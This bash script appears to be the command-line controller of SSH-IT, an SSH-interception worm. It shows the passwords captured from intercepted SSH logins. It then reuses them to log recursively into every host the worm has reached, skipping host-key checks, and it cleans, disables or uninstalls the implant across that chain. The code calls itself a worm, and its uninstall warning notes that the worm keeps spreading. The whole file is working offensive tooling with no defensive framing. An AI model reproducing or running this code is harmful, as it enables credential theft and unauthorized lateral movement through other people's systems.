#! /usr/bin/env bash

BINDIR="$(cd "$(dirname "${0}")" || exit; pwd)"
source "${BINDIR}/funcs" || exit 254

SSH_ARG_EXTRA_DEFAULT="-o ConnectTimeout=2 -o StrictHostKeyChecking=no"

# Return 0 (TRUE) if loop is detected
# Return 1 (FALSE) if no loop is detected
# loop_detect && echo LOOP-Detected
loop_detect()
{
	# Loop detection when Alice connects to Bob and Bob connects to Charlie
	# and Charlie connects to Alice...
	# - If SEEN_ID is not set then create one randomly. Store it in seen_id on _this_ host.
	# - 
	if [[ -z $THC_SEEN_ID ]]; then
		THC_SEEN_ID_LOCAL="$(THC_GET_RANDOM=1 "${THC_BASEDIR}/ssh")"
		THC_SEEN_ID="$THC_SEEN_ID_LOCAL"
	else
		# SEEN_ID exists
		if [[ -f "${THC_BASEDIR}/seen_id" ]]; then
			source "${THC_BASEDIR}/seen_id"
			[[ "${THC_SEEN_ID_LOCAL}" = "${THC_SEEN_ID}" ]] && { echo -e "[${CDR}Looping${CN}]"; return 0; }
		fi
		THC_SEEN_ID_LOCAL="$THC_SEEN_ID"
	fi
	# Update SEEN_ID to new ID
	echo "THC_SEEN_ID_LOCAL=\"${THC_SEEN_ID_LOCAL}\"" >"${THC_BASEDIR}/seen_id"

	return 1 # FALSE
}

# Return number of sessions detected.
n_logins()
{
	[[ ! -d "${THC_BASEDIR}/.d/" ]] && return 0

	n=0
	for f in "${THC_BASEDIR}/.d/"*.pwd; do
		[[ ! -f "$f" ]] && break
		n=$((n+1))
	done

	return "$n"
}

rcfile_del()
{
	local rcfile="$1"
	local data

	DEBUGF "Uninstall ${rcfile}"
	[[ -f "$rcfile" ]] || return
	grep PRNGD "${rcfile}" &>/dev/null || return

	data=$(grep -v PRNGD "${rcfile}")
	echo "$data" >"${rcfile}-new" || { WARN 91 "Could not clean ${rcfile}"; return; }
	touch -r "${rcfile}" "${rcfile}-new"
	mv "${rcfile}-new" "${rcfile}" || { WARN 92 "Could not clean ${rcfile}"; return; }
	g_n_del=$((g_n_del + 1))
}

do_disable_silent()
{
	g_n_del=0
	for rcf in .zshrc .bash_profile .bash_login .profile; do
		rcfile_del "${HOME}/${rcf}"
	done

	for rcf in /etc/profile /etc/bashrc; do
		rcfile_del "${rcf}"
	done
}

do_disable()
{
	do_disable_silent

	WSTR="${PX}└── "
	[[ "${g_n_del}" -eq 0 ]] && echo -e "${WSTR}${CDY}WARNING: SSH-IT already disabled.${CN}" || echo -e "${WSTR}Disabled"

	if [[ -z $THC_IS_REMOTE ]]; then
		echo -e "--> To disable _this_ shell either re-connect or type"
		echo -e "--> ${CM}unset -f ssh sudo command which thc_set1 &>/dev/null${CN}"
	fi
}

do_not_disable()
{
	echo -e "${PX}└── ${CDY}WARNING: NOT disabled${CN}"
}

do_clean()
{
	rm -rf "${THC_BASEDIR}/.l/sess"* 2>/dev/null 
	rm -rf "${THC_BASEDIR}/.d/db-"* 2>/dev/null
	## DO NOT remove password info. This would make it impossible to
	## access the worm.
	# rm -rf "${THC_BASEDIR}/.d/"*.pwd 2>/dev/null

	echo -e "${PX}└── cleaned"
}

do_not_clean()
{
	echo -e "${PX}└── ${CDY}WARNING: NOT cleaned${CN}"
}

do_uninstall()
{
	do_disable_silent
	[[ $THC_BASEDIR != *prng* ]] && { echo -e "${PX}└── ${CDY}WARNING: Bad THC_BASEIDR=${THC_BASEDIR}${CN}"; return; }

	rm -rf "${THC_BASEDIR:-NOTEXISTSERROR}"

	echo -e "${PX}└── uninstalled"
}

do_not_uninstall()
{
	echo -e "${PX}└── ${CDY}WARNING: NOT uninstalled${CN}"
}


do_list(){ true; }
do_not_list(){ true; }

recursive()
{
	local value
	local dx
	local cmd
	local new_arg
	local ret
	cmd="$1"

	ret=0
	loop_detect && return 0

	# See COMMENT-1
	dx="$(echo "${THC_T_PREFIX}"|tr '#' ' ')"
	PX="${dx}"

	n_logins && n=0 || n=$?
	[[ $n -le 0 ]] && { echo -e "[${CF}No logins captured${CN}]"; do${cmd}; return 0; }
	echo -e "[${CF}$n logins captured${CN}]"

	source "${THC_BASEDIR}/depth.cfg"

	PX="${dx}├── " # default
	# Recursive
	for f in "${THC_BASEDIR}/.d/"*.pwd; do

		n=$((n-1))
		[[ -n $IS_MARK_PX_LAST ]] && [[ $n -eq 0 ]] && PX="${dx}└── " # last host

		source "$f" || break
		if [[ -z $LOG_PASSWORD ]]; then
			NEW_SSH_ARG_EXTRA="${SSH_ARG_EXTRA_DEFAULT} -o BatchMode=yes"
			value="${CDM}KeyAuth${CN}"
		else
			NEW_SSH_ARG_EXTRA="${SSH_ARG_EXTRA_DEFAULT} -o NumberOfPasswordPrompts=1"
			value="${CDC}${LOG_PASSWORD}${CN}"
		fi

		[[ -n $IS_OUTPUT_TREE ]] && echo -en "${PX}${CDG}${LOG_SSH_DESTINATION}${CN}[${value}]"

		[[ -z $IS_RECURSIVE ]] && { [[ -n $IS_OUTPUT_TREE ]] && echo ""; continue; }

		# Recursive. No need to login if DEPTH is 0 here (e.g. we did not infiltrate remote)
		if [[ "$THC_DEPTH" -gt 0 ]]; then
			# COMMENT-1
			# SSH seems to strip whitespaces in variables?
			# bash -c             "X=\"   \"; echo \"len=\${#X}-\${X}-\"" => len=3-   -
			# command ssh $USER@0 "X=\"   \"; echo \"len=\${#X}-\${X}-\"" => len=1- -
			NEW_T_PREFIX="${THC_T_PREFIX}│###"
			[[ -n $IS_MARK_PX_LAST ]] && [[ $n -eq 0 ]] && NEW_T_PREFIX="${THC_T_PREFIX}####" # last host

			new_arg="source .prng/seed 2>/dev/null && [[ -f \"\${THC_BASEDIR}/thc_cli\" ]] && THC_SEEN_ID=\"${THC_SEEN_ID_LOCAL}\" THC_IS_REMOTE=1 THC_DEBUG=\"${THC_DEBUG}\" THC_T_PREFIX=\"${NEW_T_PREFIX}\" THC_SSH_DESTINATION=\"${LOG_SSH_DESTINATION}\" \"\${THC_BASEDIR}/thc_cli\" -r \"$cmd\" || echo -e \"[${CDR}SSH-IT not installed${CN}\"]"
			DEBUGF "Logging into ${LOG_SSH_DESTINATION}"
			# Bash trick to capture STDERR to a variable (it's a filedescriptor orgasm)
			{ err="$( { THC_PWD_FILE="$f" SSH_ARG_EXTRA="${NEW_SSH_ARG_EXTRA}" "${BINDIR}/ssh_login.sh" "${new_arg}"; } 2>&1 1>&3 3>&- )"; } 3>&1 || ret=$?

			if [[ $ret -ne 0 ]]; then
				{ [[ $err = *"ermission"* ]] && echo -e "[${CDR}Permission denied${CN}]"; } || \
				{ [[ $err = *"refused"* ]] && echo -e "[${CDR}Connection refused${CN}]"; } || \
				{ [[ $err = *"timed out"* ]] && echo -e "[${CDR}Connection timed out${CN}]"; } || \
				{ [[ $err = *"resolve"* ]] && echo -e "[${CDR}Could not resolve hostname${CN}]"; } || \
				{ echo -e "[${CR}ERROR: $(echo -n "$err" | tr -d \\r | head -n1)${CN}]"; }
				PX="${dx}│   "
				do_not${cmd}
			fi
		else
			echo -e "[SSH-IT ends here]"
			PX="${dx}│   "
			do${cmd}
		fi
	done

	PX="${dx}"
	do${cmd}

	return "$ret"
}

list_r()
{
	IS_MARK_PX_LAST=1 # Last host and no output ('disabled') to follow. Use '└──' rather than '├──'
	recursive "_list" && ret=0 || ret=$?
}

list()
{
	echo -en "${CDY}$(hostname)${CN}"
	THC_T_PREFIX=""
	IS_OUTPUT_TREE=1

	list_r
	# [[ -z $IS_RECURSIVE ]] && echo -e "Tip: try ${CDM}${PRG} -r list${CN}"
}


clean_r()
{
	recursive "_clean" && ret=0 || ret=$?
}

clean()
{
	echo -en "${CDY}$(hostname)${CN}"
	THC_T_PREFIX=""

	clean_r
}

uninstall_r()
{
	recursive "_uninstall" && ret=0 || ret=$?
}

uninstall()
{
	[[ -z $IS_RECURSIVE ]] && [[ -z $IS_FORCE ]] && { WARN 0 "\n"\
"  Using uninstall without -r is dangerous. Doing so will remove SSH-IT from\n"\
"  _this_ host only. Any login information to any other host will be lost.\n"\
"  Access to SSH-IT spread beyond _this_ host will be lost but SSH-IT will\n"\
"  keep spreading. Use -f to overwrite or to delete SSH-IT from _all_ hosts\n"\
"  use -r:\n"\
"          ${CDM}${PRG} -r uninstall${CN}"; exit 0; }

	echo -en "${CDY}$(hostname)${CN}"
	THC_T_PREFIX=""

	uninstall_r
}

disable_r()
{
	recursive "_disable" && ret=0 || ret=$?
}

disable()
{
	echo -en "${CDY}$(hostname)${CN}"
	THC_T_PREFIX=""

	disable_r
}



usage()
{
	[[ -n $2 ]] && echo -e >&2 "$2"

	echo -e >&2 ""\
"usage: $PRG [-hr] [command]\n"\
"    -h          This help\n"\
"    -r          Recursive (for all hosts)\n"\
"Command:\n"\
"    list      - Show passwords\n"\
"    clean     - Clean logfiles and state information\n"\
"    disable   - Disable interception\n"\
"    uninstall - Clean, Disable and Remove completly\n"\
"Example: $PRG -r list"

	exit "$1"
}

init_vars()
{
	PX=""
	PRG="$(basename $0)"
	while getopts ":hrf" opt; do
		case ${opt} in
			h )
				usage 0
				;;
			r )
				IS_RECURSIVE=1
				IS_OUTPUT_TREE=1
				;;
			f )
				IS_FORCE=1
				;;
		esac
	done
	shift $((OPTIND - 1))

	[[ "$1" = "list" ]] && { list; exit; }
	[[ "$1" = "_list" ]] && { list_r; exit; } # INTERNAL
	[[ "$1" = "clean" ]] && { clean; exit; }
	[[ "$1" = "_clean" ]] && { clean_r; exit; }
	[[ "$1" = "disable" ]] && { disable; exit; }
	[[ "$1" = "_disable" ]] && { disable_r; exit; }
	[[ "$1" = "uninstall" ]] && { uninstall; exit; }
	[[ "$1" = "_uninstall" ]] && { uninstall_r; exit; }
	usage 255 "unknown command -- $1"
}

DEBUGF "thc_cli host=$(hostname)[${USER}]"
[[ -z $THC_BASEDIR ]] && ERREXIT 44 "THC_BASEDIR= is not set"

init_vars "$@"


